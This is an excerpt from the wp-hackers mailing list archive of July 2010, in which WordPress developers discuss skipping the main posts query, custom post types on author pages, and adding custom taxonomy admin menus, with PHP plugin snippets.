>> I just ran the current trunk version of that page through the w3c validator and all it complains about is "autocomplete"
> 
> I didn't get that far.  I couldn't confirm because that file doesn't exist :)
> 
> http://core.trac.wordpress.org/browser/tags/3.0.1/wp-admin/posts.php
> 

:-)  I just assumed he meant wp-admin/post.php 
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From mikeschinkel at newclarity.net  Sat Jul 31 09:51:24 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 31 Jul 2010 05:51:24 -0400
Subject: [wp-hackers] Unmatched </p> encountered? (/wp-admin/posts.php
	lines 702 & 703)
In-Reply-To: <56546C27-513F-4C08-A83E-83CAB84FA115@ftwr.co.uk>
References: <545C961E-30B4-4916-8410-8FDBBAEE0996@newclarity.net>
	<2EC854AF-5E41-4A61-9D54-ACD4FBC73B7E@ftwr.co.uk>
	<AANLkTimYJ-3rMHb3S=8eMXWYo_-msdCRNM24QTEKiTeq@mail.gmail.com>
	<56546C27-513F-4C08-A83E-83CAB84FA115@ftwr.co.uk>
Message-ID: <EDDCEAE1-B25E-4481-B3ED-698B807E8906@newclarity.net>

Yeah, it was my bad on that.  Sorry for the false alarm, I found the problem (was having a brain freeze when I reported that, i guess.)

-Mike

On Jul 31, 2010, at 4:29 AM, Peter Westwood wrote:

> 
> On 31 Jul 2010, at 09:28, Michael D Adams wrote:
> 
>> On Sat, Jul 31, 2010 at 1:24 AM, Peter Westwood
>> <peter.westwood at ftwr.co.uk> wrote:
>>> 
>>> On 31 Jul 2010, at 02:43, Mike Schinkel wrote:
>>> 
>>>> Has anyone else come across this error in v3.0.1?  Safari's inspector is reporting the following on both lines 702 and 703 of /wp-admin/posts.php.
>>>> 
>>>> "Unmatched </p> encountered?  Converting </p> into <p></p>."
>>>> 
>>>> If others can confirm I'll submit a trac ticket...
>>>> 
>>> 
>>> I just ran the current trunk version of that page through the w3c validator and all it complains about is "autocomplete"
>> 
>> I didn't get that far.  I couldn't confirm because that file doesn't exist :)
>> 
>> http://core.trac.wordpress.org/browser/tags/3.0.1/wp-admin/posts.php
>> 
> 
> :-)  I just assumed he meant wp-admin/post.php 
> -- 
> Peter Westwood
> http://blog.ftwr.co.uk | http://westi.wordpress.com
> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From theodor_ramisch at hotmail.com  Sat Jul 31 11:25:37 2010
From: theodor_ramisch at hotmail.com (Theodor Ramisch)
Date: Sat, 31 Jul 2010 13:25:37 +0200
Subject: [wp-hackers] Skip Main Query
In-Reply-To: <4C537CDC.7050100@voceconnect.com>
References: <BLU136-W3251F77E9581669EC5024F90AA0@phx.gbl>,
	<4C537CDC.7050100@voceconnect.com>
Message-ID: <BLU136-W3286CC2D187C4FDF15D30290AB0@phx.gbl>


Hi Michael,

the init hook is a little bit to early. I want to use the rewrite system of WordPress and things like query_vars are not available at this point yet, so I would have to implement that by myself using server variables like REQUEST_URI.

Theodor

> Date: Fri, 30 Jul 2010 21:31:08 -0400
> From: mpretty at voceconnect.com
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Skip Main Query
> 
> If you don't need anything from the initial query, is there a reason you 
> don't just take over earlier, like 'init'?  Most everything should be 
> loaded at that point.
> 
> Michael Pretty
> prettyboymp
> 
> On 7/30/10 6:54 PM, Theodor Ramisch wrote:
> > Hi,
> >
> > I'm writing a plugin which should display data from its own tables in XML. It does not rely on any posts.
> >
> > To reach my plugin, I've added query_vars, the rewrite rules and listen on template_redirect for the parameters.
> >
> > No I've noticed that WordPress still queries the posts from the start page. Is there a way to avoid that? Since I don't need the posts, I don't want to make that query.
> >
> > Bypassing WP completely using mod_rewrite rules is not an option, since I need to have access to the database, permissions and so on.
> >
> > Thanks,
> >
> >    Theodor
> >   		 	   		
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >    
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
 		 	   		  

From theodor_ramisch at hotmail.com  Sat Jul 31 11:27:10 2010
From: theodor_ramisch at hotmail.com (Theodor Ramisch)
Date: Sat, 31 Jul 2010 13:27:10 +0200
Subject: [wp-hackers] Skip Main Query
In-Reply-To: <AANLkTikTvq4PMbDhXVRyEqBjP_G=WOyg=A6+kvugYpj5@mail.gmail.com>
References: <BLU136-W3251F77E9581669EC5024F90AA0@phx.gbl>,
	<AANLkTikTvq4PMbDhXVRyEqBjP_G=WOyg=A6+kvugYpj5@mail.gmail.com>
Message-ID: <BLU136-W37B842E56E5A0729CA832190AB0@phx.gbl>


Thanks Michael, I will try if that works.

> From: mda at blogwaffe.com
> Date: Sat, 31 Jul 2010 01:18:18 -0700
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Skip Main Query
> 
> On Fri, Jul 30, 2010 at 3:54 PM, Theodor Ramisch
> <theodor_ramisch at hotmail.com> wrote:
> > No I've noticed that WordPress still queries the posts from the start page. Is there a way to avoid that?
> 
> The following plugin works for me in WP 3.0.
> 
> 
> /*
> Plugin Name: Kill Front Page Query
> */
> 
> function kill_front_page_query() {
> 	add_filter( 'posts_request', 'kill_one_posts_request', 1000, 2 );
> }
> 
> // apply_filters_ref_array() is a beautiful thing
> function kill_one_posts_request( $sql, &$query ) {
> 	// The main query is running on the front page
> 	// And the currently running query is that main query
> 	if ( is_front_page() && $query->is_home &&
> $GLOBALS['wp_the_query']->is_home ) {
> 		// We only want to do this once: remove the filter
> 		remove_filter( 'posts_request', 'kill_one_posts_request', 1000 );
> 		// Kill the FOUND_ROWS() query too
> 		$query->query_vars['no_found_rows'] = true;
> 		return ''; // Kill the query
> 	}
> 	return $sql;
> }
> 
> add_filter( 'parse_request', 'kill_front_page_query' );
> 
> 
> On the front page of a site with no fancy nav menu, I get one query
> when viewing it logged out:
> 
> SELECT option_name, option_value FROM wp_options WHERE autoload = 'yes'
> 
> Mike
> --mdawaffe
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
 		 	   		  

From skeltoac at gmail.com  Sat Jul 31 11:48:11 2010
From: skeltoac at gmail.com (Andy Skelton)
Date: Sat, 31 Jul 2010 06:48:11 -0500
Subject: [wp-hackers] Skip Main Query
In-Reply-To: <BLU136-W3251F77E9581669EC5024F90AA0@phx.gbl>
References: <BLU136-W3251F77E9581669EC5024F90AA0@phx.gbl>
Message-ID: <AANLkTi=S=QgxB-z8bZA8Ad0QQaWXw2r01=e38D-43Gcw@mail.gmail.com>

> No I've noticed that WordPress still queries the posts from the start page. Is there a way to avoid that? Since I don't need the posts, I don't want to make that query.

Just replace wp::query_posts() with something more appropriate for
your situation. Easy. ;-)

This is how I made the Freshly Pressed feed on WordPress.com. It's a
multisite feed that gets blog_id and post_id from a table. It
populates $wp_the_query with all of the values necessary for a loop,
avoiding the standard core query, and switching blogs on each post.

This code is from the theme's functions.php. It could be written as a
plugin as well. There are probably some useless or erroneous lines. I
haven't planned on refining or packaging this, so consider this its
GPL distribution. :) If you decide to make an official plugin from
this, please add "andy" and "automattic" as contributors.

add_action('init', 'freshlypressed_init');

// Runs at end of init. Supplants global WP object.
function freshlypressed_init() {
        $GLOBALS['wp'] =& new freshlypressed_wp();

	add_action('the_post', 'freshlypressed_the_post', 10, 1);
        add_action('loop_end', 'freshlypressed_the_post', 10, 1);

	add_filter('get_lastpostmodified', 'freshlypressed_latest', 10001);
}

// This gets the latest date from the right place so feed 304s work
properly.
function freshlypressed_latest() {
	global $wpdb;
	return $wpdb->get_var("SELECT picked_on FROM botm_en ORDER BY
picked_on DESC LIMIT 1");
}

// This runs before every loop and after the last one. It switches to
the post's blog for each post in the loop.
function freshlypressed_the_post($post = null) {
        restore_current_blog();
        if ( is_object($post) && isset($post->blog_id) )
		switch_to_blog($post->blog_id);
}

class freshlypressed_wp extends wp {
        function query_posts() {
                global $wp_the_query, $wpdb;
                $this->build_query_string();
                // $wp_the_query->query($this->query_vars);

		// The whole point of overriding this method is to replace that
                // commented third line with our post-gathering code
(below).

		$wp_the_query->parse_query($this->query_vars);

		// Nothing but feeds here. And none of those "singular" comment
feeds. Just paged feeds.
                if ( !is_feed() || is_singular() ) {
                        wp_redirect('/feed/');
                        die;
                }

		if ( isset($this->query_vars['paged']) )
                        $page = max(intval($this->query_vars['paged']), 1);
                else
                        $page = 1;
                $start = 10 * ($page - 1);
                $blog_posts = $wpdb->get_results("SELECT
SQL_CALC_FOUND_ROWS blog_id, post_id FROM botm_en ORDER BY picked_on
DESC LIMIT $start, 10");

		$wp_the_query->found_posts = $wpdb->get_var("SELECT FOUND_ROWS()");
                $wp_the_query->max_num_pages =
ceil($wp_the_query->found_posts / 10);
                $wp_the_query->post_count = 10;

		foreach ( $blog_posts as $a ) {
                        $post =
sanitize_post(get_blog_post($a->blog_id, $a->post_id), 'raw');
                        $post->blog_id = $a->blog_id;
                        $wp_the_query->posts[] = $post;
                }

		$wp_the_query->post = $wp_the_query->posts[0];

		if ( is_home() ) {
                        $wp_the_query->is_home = null;
                        $wp_the_query->is_archive = true;
                }
        }
}

From cross at thisismyurl.com  Sat Jul 31 13:48:44 2010
From: cross at thisismyurl.com (Christopher Ross)
Date: Sat, 31 Jul 2010 10:48:44 -0300
Subject: [wp-hackers] WP 3 Multisite List Blogs
Message-ID: <75142B22-ED21-46B8-811F-BE6BAA61F404@thisismyurl.com>

Hi all, is there a function to list the URL of all child blogs in a multi site?

__

Christopher Ross

Toronto      1 (416) 840-5828
Fredericton 1 (506) 474-2708
New Orleans 1 (504) 322 3485

http://christopherross.ca
http://www.thisismyurl.com


From krustyruffle at rustykruffle.com  Sat Jul 31 17:27:16 2010
From: krustyruffle at rustykruffle.com (Krusty Ruffle)
Date: Sat, 31 Jul 2010 13:27:16 -0400
Subject: [wp-hackers] pre_get_posts problem
In-Reply-To: <AANLkTikTL-q76TTdddbE=wqbVvsD=MbiTda_GagatiY+@mail.gmail.com>
References: <AANLkTikTL-q76TTdddbE=wqbVvsD=MbiTda_GagatiY+@mail.gmail.com>
Message-ID: <AANLkTimw8p-Q8b1YUr7-nu87YTnAdmDusAPaBCuUc539@mail.gmail.com>

I've been trying to figure this out too. I have not figured out a way to use
the 'request' filter for this. I think the problem is that the conditional
functions cannot work at this point. If you take out if statement then you
can inject the custom post types in there, but it is site-wide and causes
issues on some of the admin pages. I've also looked into the 'parse_request'
action which seems to have the same problems. Looking at the 'query_vars'
filter does no good as the custom post type is already in the
'public_query_vars' array, assuming the post type is 'publicly_queryable'.

The 'pre_get_posts' filter seems hackish but it also seems to work without
problems, assuming you block it from working on admin pages.

Sorry that I do not have an answer for you, but maybe someone with more
understanding can see what's been tried and what we're missing here...


On Sat, Jul 31, 2010 at 2:42 AM, Angelia Baladon
<angelia at 10sexyapples.com>wrote:

> Hi all,
> Well, I'm still at it trying to figure out what to do to get my custom post
> types in the loop for my author.php file. Ironically, I think I'm beginning
> to understand why everyone is using the pre_get_posts solution ... ? I got
> this bit from Andrew ... thanks Andrew! but, unfortunately, I tested it and
> it didn't return any results. Does anyone else have anything to add that
> might help here? There are literally hundreds of sites out there
> recommending the pre_get_posts solution to this, so, it anyone can help
> sort
> this out, I'll be sure to go viral with the answer ... if only *sigh*. It's
> over my head, so, all I can do is keep begging ;-)
>
> Here's the code from Andrew:
>
> <code>
> function my_request_cpt_author( $query_vars ) {
>   if ( is_author() )
>      $query_vars['post_type'] = array( 'post', 'my_post_type' );
>   return $query_vars;
> }
> add_filter( 'request', 'my_request_cpt_author' );
> </code>
>
> It's a whole new month, so, how 'bout it?
>
> Angie
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Sat Jul 31 19:34:18 2010
From: scribu at gmail.com (scribu)
Date: Sat, 31 Jul 2010 22:34:18 +0300
Subject: [wp-hackers] Skip Main Query
In-Reply-To: <AANLkTi=S=QgxB-z8bZA8Ad0QQaWXw2r01=e38D-43Gcw@mail.gmail.com>
References: <BLU136-W3251F77E9581669EC5024F90AA0@phx.gbl>
	<AANLkTi=S=QgxB-z8bZA8Ad0QQaWXw2r01=e38D-43Gcw@mail.gmail.com>
Message-ID: <AANLkTinXlIN1DeHNMO8-bO5ElNnMXIKJoUx0JVUQpsDY@mail.gmail.com>

On Sat, Jul 31, 2010 at 2:48 PM, Andy Skelton <skeltoac at gmail.com> wrote:

> // Runs at end of init. Supplants global WP object.
> function freshlypressed_init() {
>        $GLOBALS['wp'] =& new freshlypressed_wp();
>


Talk about ultimate extensibility. Fantastic!


-- 
http://scribu.net

From danielbachhuber at gmail.com  Sat Jul 31 21:04:33 2010
From: danielbachhuber at gmail.com (Daniel Bachhuber)
Date: Sat, 31 Jul 2010 17:04:33 -0400
Subject: [wp-hackers] Adding custom taxonomies as submenus to custom admin
	top-level menu
Message-ID: <281411A0-1D66-4991-9F82-FB6B205EAA4F@gmail.com>

Hey all,
I'm creating a plugin that uses three custom taxonomies  
('pitch_status', 'user_type', and 'user_role'). The first is tied to  
posts and the second and third are tied to users. I'd like to use  
add_submenu_page to add the edit screens for each of these taxonomies  
to the custom menu for the plugin. Is this possible? I'd prefer not to  
reinvent the wheel and have to create my own edit views.

Thanks much,

Daniel

--
Daniel Bachhuber
www.danielbachhuber.com
danielbachhuber at gmail.com
cell: +1 971 998 5407
aim/skype/twitter: danielbachhuber


From charles at cefm.ca  Sat Jul 31 21:10:08 2010
From: charles at cefm.ca (Charles Frees-Melvin)
Date: Sat, 31 Jul 2010 18:10:08 -0300
Subject: [wp-hackers] Adding custom taxonomies as submenus to custom
	admin top-level menu
In-Reply-To: <281411A0-1D66-4991-9F82-FB6B205EAA4F@gmail.com>
References: <281411A0-1D66-4991-9F82-FB6B205EAA4F@gmail.com>
Message-ID: <DB691480-E3BB-41FB-8E1C-A2A2712AAFD6@cefm.ca>

It is not possible in 3.0.1 without hacking core. http://core.trac.wordpress.org/ticket/13414 is related but is for media rather than users but is the same issue.
---
Charles E. Frees-Melvin
charles at cefm.ca
www.cefm.ca
(506) 640-1007

On 2010-07-31, at 6:04 PM, Daniel Bachhuber wrote:

> Hey all,
> I'm creating a plugin that uses three custom taxonomies ('pitch_status', 'user_type', and 'user_role'). The first is tied to posts and the second and third are tied to users. I'd like to use add_submenu_page to add the edit screens for each of these taxonomies to the custom menu for the plugin. Is this possible? I'd prefer not to reinvent the wheel and have to create my own edit views.
> 
> Thanks much,
> 
> Daniel
> 
> --
> Daniel Bachhuber
> www.danielbachhuber.com
> danielbachhuber at gmail.com
> cell: +1 971 998 5407
> aim/skype/twitter: danielbachhuber
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From danielbachhuber at gmail.com  Sat Jul 31 21:16:50 2010
From: danielbachhuber at gmail.com (Daniel Bachhuber)
Date: Sat, 31 Jul 2010 17:16:50 -0400
Subject: [wp-hackers] Adding custom taxonomies as submenus to custom
	admin top-level menu
In-Reply-To: <DB691480-E3BB-41FB-8E1C-A2A2712AAFD6@cefm.ca>
References: <281411A0-1D66-4991-9F82-FB6B205EAA4F@gmail.com>
	<DB691480-E3BB-41FB-8E1C-A2A2712AAFD6@cefm.ca>
Message-ID: <1F6ACD12-F621-41D9-8D02-DC127E5B8A79@gmail.com>

Ah, so the same issue probably exists for the 'user' type as well?

Thanks,

Daniel

--
Daniel Bachhuber
... is sending this from his mobile

danielbachhuber.com
danielbachhuber at gmail.com
cell: +1 971 998 5407
aim/skype/twitter: danielbachhuber

On Jul 31, 2010, at 5:10 PM, Charles Frees-Melvin <charles at cefm.ca> wrote:

> It is not possible in 3.0.1 without hacking core. http://core.trac.wordpress.org/ticket/13414 is related but is for media rather than users but is the same issue.
> ---
> Charles E. Frees-Melvin
> charles at cefm.ca
> www.cefm.ca
> (506) 640-1007
> 
> On 2010-07-31, at 6:04 PM, Daniel Bachhuber wrote:
> 
>> Hey all,
>> I'm creating a plugin that uses three custom taxonomies ('pitch_status', 'user_type', and 'user_role'). The first is tied to posts and the second and third are tied to users. I'd like to use add_submenu_page to add the edit screens for each of these taxonomies to the custom menu for the plugin. Is this possible? I'd prefer not to reinvent the wheel and have to create my own edit views.
>> 
>> Thanks much,
>> 
>> Daniel
>> 
>> --
>> Daniel Bachhuber
>> www.danielbachhuber.com
>> danielbachhuber at gmail.com
>> cell: +1 971 998 5407
>> aim/skype/twitter: danielbachhuber
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From mikeschinkel at newclarity.net  Sat Jul 31 21:35:45 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 31 Jul 2010 17:35:45 -0400
Subject: [wp-hackers] Adding custom taxonomies as submenus to custom
	admin top-level menu
In-Reply-To: <281411A0-1D66-4991-9F82-FB6B205EAA4F@gmail.com>
References: <281411A0-1D66-4991-9F82-FB6B205EAA4F@gmail.com>
Message-ID: <127EB5FF-E3AD-4CD5-AD4D-C90B96A40A36@newclarity.net>

Daniel:

Is this what you are looking for?

add_action('admin_menu', 'my_admin_menu');
function my_admin_menu() {
	add_menu_page('My Plugin Menu','My Plugin Menu', 'manage_options', 'admin.php?action=my_plugins_action');
	add_submenu_page('admin.php?action=my_plugins_action', 'Pitch Statuses', 'Pitch Statuses', 'manage_options', 'edit-tags.php?taxonomy=pitch_status');
	add_submenu_page('admin.php?action=my_plugins_action', 'User Types', 'User Types', 'manage_options', 'edit-tags.php?taxonomy=user_type');
	add_submenu_page('admin.php?action=my_plugins_action', 'User Roles', 'User Roles', 'manage_options', 'edit-tags.php?taxonomy=user_role');
}

Note, this assumes:

1.) You creates a custom post type for users that mirrors the user (There is currently no way to create a taxonomy for a user),
2.) Your main plugin page is located in the admin at "admin.php?action=my_plugins_action".

-Mike

On Jul 31, 2010, at 5:04 PM, Daniel Bachhuber wrote:

> Hey all,
> I'm creating a plugin that uses three custom taxonomies ('pitch_status', 'user_type', and 'user_role'). The first is tied to posts and the second and third are tied to users. I'd like to use add_submenu_page to add the edit screens for each of these taxonomies to the custom menu for the plugin. Is this possible? I'd prefer not to reinvent the wheel and have to create my own edit views.
> 
> Thanks much,
> 
> Daniel
> 
> --
> Daniel Bachhuber
> www.danielbachhuber.com
> danielbachhuber at gmail.com
> cell: +1 971 998 5407
> aim/skype/twitter: danielbachhuber
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From joshua.sibelman at gmail.com  Sat Jul 31 21:52:29 2010
From: joshua.sibelman at gmail.com (Joshua Sibelman)
Date: Sat, 31 Jul 2010 14:52:29 -0700
Subject: [wp-hackers] Custom taxonomies and admin menus
Message-ID: <144231A0-2B3B-48C6-8727-9BEE7156AA5E@gmail.com>

I hope this isn't an obvious question, but I wasn't able to find anything on this in the Codex.

I created a plugin for a client that registers a new post type with two attendant hierarchical taxonomies. When the taxonomies are registered via the plugin, I do not see line items in the admin menu to access them for editing. If I move the taxonomy registration out of the plugin and into the theme's functions.php file, then the menu items appear.

Can anyone explain this behavior? Is there something specific I need to do when registering taxonomies via plugin vs. the functions.php file to get the menus to appear?

Thanks for any help you can give me.

Josh

From mikeschinkel at newclarity.net  Sat Jul 31 22:22:50 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 31 Jul 2010 18:22:50 -0400
Subject: [wp-hackers] Custom taxonomies and admin menus
In-Reply-To: <144231A0-2B3B-48C6-8727-9BEE7156AA5E@gmail.com>
References: <144231A0-2B3B-48C6-8727-9BEE7156AA5E@gmail.com>
Message-ID: <E118293A-4ED8-474D-88CE-E3FB1B211FE9@newclarity.net>

In the plugin are you doing it in the global area of the .PHP file on in an init hook?

-Mike

On Jul 31, 2010, at 5:52 PM, Joshua Sibelman wrote:

> I hope this isn't an obvious question, but I wasn't able to find anything on this in the Codex.
> 
> I created a plugin for a client that registers a new post type with two attendant hierarchical taxonomies. When the taxonomies are registered via the plugin, I do not see line items in the admin menu to access them for editing. If I move the taxonomy registration out of the plugin and into the theme's functions.php file, then the menu items appear.
> 
> Can anyone explain this behavior? Is there something specific I need to do when registering taxonomies via plugin vs. the functions.php file to get the menus to appear?
> 
> Thanks for any help you can give me.
> 
> Josh
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From joshua.sibelman at gmail.com  Sat Jul 31 22:40:07 2010
From: joshua.sibelman at gmail.com (Joshua Sibelman)
Date: Sat, 31 Jul 2010 15:40:07 -0700
Subject: [wp-hackers] Custom taxonomies and admin menus
In-Reply-To: <E118293A-4ED8-474D-88CE-E3FB1B211FE9@newclarity.net>
References: <144231A0-2B3B-48C6-8727-9BEE7156AA5E@gmail.com>
	<E118293A-4ED8-474D-88CE-E3FB1B211FE9@newclarity.net>
Message-ID: <F5C092FD-E485-4D21-84D7-2B458300EC0F@gmail.com>

I'm registering the taxonomies on init, like so:
add_action('admin_init', array($this, 'createListingTaxonomies'), 0);


On Jul 31, 2010, at 3:22 PM, Mike Schinkel wrote:

> In the plugin are you doing it in the global area of the .PHP file on in an init hook?
> 
> -Mike
> 
> On Jul 31, 2010, at 5:52 PM, Joshua Sibelman wrote:
> 
>> I hope this isn't an obvious question, but I wasn't able to find anything on this in the Codex.
>> 
>> I created a plugin for a client that registers a new post type with two attendant hierarchical taxonomies. When the taxonomies are registered via the plugin, I do not see line items in the admin menu to access them for editing. If I move the taxonomy registration out of the plugin and into the theme's functions.php file, then the menu items appear.
>> 
>> Can anyone explain this behavior? Is there something specific I need to do when registering taxonomies via plugin vs. the functions.php file to get the menus to appear?
>> 
>> Thanks for any help you can give me.
>> 
>> Josh
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Sat Jul 31 22:44:53 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 31 Jul 2010 18:44:53 -0400
Subject: [wp-hackers] Custom taxonomies and admin menus
In-Reply-To: <F5C092FD-E485-4D21-84D7-2B458300EC0F@gmail.com>
References: <144231A0-2B3B-48C6-8727-9BEE7156AA5E@gmail.com>
	<E118293A-4ED8-474D-88CE-E3FB1B211FE9@newclarity.net>
	<F5C092FD-E485-4D21-84D7-2B458300EC0F@gmail.com>
Message-ID: <0BC4B936-E192-43D1-9862-3477B3527C07@newclarity.net>

Can you post your register_taxonomy() code?

On Jul 31, 2010, at 6:40 PM, Joshua Sibelman wrote:

> I'm registering the taxonomies on init, like so:
> add_action('admin_init', array($this, 'createListingTaxonomies'), 0);
> 
> 
> On Jul 31, 2010, at 3:22 PM, Mike Schinkel wrote:
> 
>> In the plugin are you doing it in the global area of the .PHP file on in an init hook?
>> 
>> -Mike
>> 
>> On Jul 31, 2010, at 5:52 PM, Joshua Sibelman wrote:
>> 
>>> I hope this isn't an obvious question, but I wasn't able to find anything on this in the Codex.
>>> 
>>> I created a plugin for a client that registers a new post type with two attendant hierarchical taxonomies. When the taxonomies are registered via the plugin, I do not see line items in the admin menu to access them for editing. If I move the taxonomy registration out of the plugin and into the theme's functions.php file, then the menu items appear.
>>> 
>>> Can anyone explain this behavior? Is there something specific I need to do when registering taxonomies via plugin vs. the functions.php file to get the menus to appear?
>>> 
>>> Thanks for any help you can give me.
>>> 
>>> Josh


From joshua.sibelman at gmail.com  Sat Jul 31 22:47:39 2010
From: joshua.sibelman at gmail.com (Joshua Sibelman)
Date: Sat, 31 Jul 2010 15:47:39 -0700
Subject: [wp-hackers] Custom taxonomies and admin menus
In-Reply-To: <0BC4B936-E192-43D1-9862-3477B3527C07@newclarity.net>
References: <144231A0-2B3B-48C6-8727-9BEE7156AA5E@gmail.com>
	<E118293A-4ED8-474D-88CE-E3FB1B211FE9@newclarity.net>
	<F5C092FD-E485-4D21-84D7-2B458300EC0F@gmail.com>
	<0BC4B936-E192-43D1-9862-3477B3527C07@newclarity.net>
Message-ID: <E1610753-E89A-4A8B-9380-8CF43E039D2D@gmail.com>

http://pastebin.com/App1td55

Thanks for checking it out.



On Jul 31, 2010, at 3:44 PM, Mike Schinkel wrote:

> Can you post your register_taxonomy() code?
> 
> On Jul 31, 2010, at 6:40 PM, Joshua Sibelman wrote:
> 
>> I'm registering the taxonomies on init, like so:
>> add_action('admin_init', array($this, 'createListingTaxonomies'), 0);
>> 
>> 
>> On Jul 31, 2010, at 3:22 PM, Mike Schinkel wrote:
>> 
>>> In the plugin are you doing it in the global area of the .PHP file on in an init hook?
>>> 
>>> -Mike
>>> 
>>> On Jul 31, 2010, at 5:52 PM, Joshua Sibelman wrote:
>>> 
>>>> I hope this isn't an obvious question, but I wasn't able to find anything on this in the Codex.
>>>> 
>>>> I created a plugin for a client that registers a new post type with two attendant hierarchical taxonomies. When the taxonomies are registered via the plugin, I do not see line items in the admin menu to access them for editing. If I move the taxonomy registration out of the plugin and into the theme's functions.php file, then the menu items appear.
>>>> 
>>>> Can anyone explain this behavior? Is there something specific I need to do when registering taxonomies via plugin vs. the functions.php file to get the menus to appear?
>>>> 
>>>> Thanks for any help you can give me.
>>>> 
>>>> Josh
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Sat Jul 31 22:56:32 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 31 Jul 2010 18:56:32 -0400
Subject: [wp-hackers] Custom taxonomies and admin menus
In-Reply-To: <E1610753-E89A-4A8B-9380-8CF43E039D2D@gmail.com>
References: <144231A0-2B3B-48C6-8727-9BEE7156AA5E@gmail.com>
	<E118293A-4ED8-474D-88CE-E3FB1B211FE9@newclarity.net>
	<F5C092FD-E485-4D21-84D7-2B458300EC0F@gmail.com>
	<0BC4B936-E192-43D1-9862-3477B3527C07@newclarity.net>
	<E1610753-E89A-4A8B-9380-8CF43E039D2D@gmail.com>
Message-ID: <8BEA8134-619D-49DC-A051-9342FBDBDA12@newclarity.net>

Hi Joshua :

Try this instead:

add_action('init', array($this, 'createListingTaxonomies'), 0);

-Mike

On Jul 31, 2010, at 6:47 PM, Joshua Sibelman wrote:

> http://pastebin.com/App1td55
> 
> Thanks for checking it out.
> 
> 
> 
> On Jul 31, 2010, at 3:44 PM, Mike Schinkel wrote:
> 
>> Can you post your register_taxonomy() code?
>> 
>> On Jul 31, 2010, at 6:40 PM, Joshua Sibelman wrote:
>> 
>>> I'm registering the taxonomies on init, like so:
>>> add_action('admin_init', array($this, 'createListingTaxonomies'), 0);
>>> 
>>> 
>>> On Jul 31, 2010, at 3:22 PM, Mike Schinkel wrote:
>>> 
>>>> In the plugin are you doing it in the global area of the .PHP file on in an init hook?
>>>> 
>>>> -Mike
>>>> 
>>>> On Jul 31, 2010, at 5:52 PM, Joshua Sibelman wrote:
>>>> 
>>>>> I hope this isn't an obvious question, but I wasn't able to find anything on this in the Codex.
>>>>> 
>>>>> I created a plugin for a client that registers a new post type with two attendant hierarchical taxonomies. When the taxonomies are registered via the plugin, I do not see line items in the admin menu to access them for editing. If I move the taxonomy registration out of the plugin and into the theme's functions.php file, then the menu items appear.
>>>>> 
>>>>> Can anyone explain this behavior? Is there something specific I need to do when registering taxonomies via plugin vs. the functions.php file to get the menus to appear?
>>>>> 
>>>>> Thanks for any help you can give me.
>>>>> 
>>>>> Josh
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From joshua.sibelman at gmail.com  Sat Jul 31 22:59:14 2010
From: joshua.sibelman at gmail.com (Joshua Sibelman)
Date: Sat, 31 Jul 2010 15:59:14 -0700
Subject: [wp-hackers] Custom taxonomies and admin menus
In-Reply-To: <8BEA8134-619D-49DC-A051-9342FBDBDA12@newclarity.net>
References: <144231A0-2B3B-48C6-8727-9BEE7156AA5E@gmail.com>
	<E118293A-4ED8-474D-88CE-E3FB1B211FE9@newclarity.net>
	<F5C092FD-E485-4D21-84D7-2B458300EC0F@gmail.com>
	<0BC4B936-E192-43D1-9862-3477B3527C07@newclarity.net>
	<E1610753-E89A-4A8B-9380-8CF43E039D2D@gmail.com>
	<8BEA8134-619D-49DC-A051-9342FBDBDA12@newclarity.net>
Message-ID: <7F7B49E9-EF4D-44CA-8257-8C2CC35BC768@gmail.com>

I have. It makes no difference.


On Jul 31, 2010, at 3:56 PM, Mike Schinkel wrote:

> Hi Joshua :
> 
> Try this instead:
> 
> add_action('init', array($this, 'createListingTaxonomies'), 0);
> 
> -Mike
> 
> On Jul 31, 2010, at 6:47 PM, Joshua Sibelman wrote:
> 
>> http://pastebin.com/App1td55
>> 
>> Thanks for checking it out.
>> 
>> 
>> 
